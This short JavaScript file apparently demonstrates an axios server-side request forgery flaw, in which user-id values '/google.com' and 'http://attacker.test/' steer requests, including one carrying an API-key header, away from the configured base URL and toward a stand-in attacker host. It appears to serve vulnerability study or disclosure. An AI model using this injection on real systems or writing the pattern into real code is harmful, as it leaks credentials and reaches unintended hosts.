import axios from 'axios';
class ClassA {
    constructor() {
        this.axios = axios.create({
            baseURL: 'https://userapi.example.com',
        });
    }
    func1() {
        //userId = '12345';
        var userId = '/google.com'
        this.axios.get(`/${userId}`).then(function (response) {
            console.log(`config.baseURL:  ${response.config.baseURL}`);
            console.log(`config.method:   ${response.config.method}`);
            console.log(`config.url:      ${response.config.url}`);
            console.log(`res.responseUrl: ${response.request.res.responseUrl}`);
        });
    }
    func2() {
        const internalAPIClient = axios.create({
            baseURL: "http://example.test/api/v1/users/",
            headers: {
                "X-API-KEY": "1234567890",
            },
        });
        // const userId = "123";
        const userId = "http://attacker.test/";
        internalAPIClient.get(userId); // SSRF
    }
}


function MakeAPIInvocation() {
    let classA = new ClassA();
    classA.func1()
    classA.func2()
}

MakeAPIInvocation()




